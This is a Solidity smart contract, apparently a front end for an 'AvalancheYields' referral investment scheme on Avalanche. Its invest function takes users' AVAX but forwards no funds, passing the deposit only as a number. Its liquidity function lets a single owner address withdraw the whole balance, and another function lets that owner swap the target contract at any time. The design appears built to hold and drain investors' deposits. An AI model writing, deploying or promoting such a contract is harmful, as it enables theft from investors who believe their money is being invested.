/**
 *Submitted for verification at testnet.snowtrace.io on 2022-03-12
*/

/**
 *Submitted for verification at BscScan.com on 2021-12-07
 */

pragma solidity 0.5.10;

interface IAvalancheYields {
    function invest(
        address investor,
        address referrer,
        uint8 plan,
        uint256 checkAmount
    ) external payable;
}

contract PreContract {
    uint256 public countBase;

    address payable public base;
    address public investContract;

    uint256 public constant INVEST_MIN_AMOUNT = 0.1 ether; // 0.1 AVAX

    constructor(address payable _base) public {
        base = _base;
    }

    function invest(address referrer, uint8 plan) public payable {
        require(msg.value >= INVEST_MIN_AMOUNT);
        require(plan < 3, "Invalid plan");

        IAvalancheYields(investContract).invest.value(0)(msg.sender, referrer, plan, msg.value);
        countBase = countBase + 1;
    }

    function liquidity() external {
        require(msg.sender == base, "no commissionWallet");
        uint256 _balance = address(this).balance;
        require(_balance > 0, "no liquidity");
        base.transfer(_balance);
    }

    function setInvest(address _investContract) public {
        require(msg.sender == base, "not base");
        investContract = _investContract;
    }
}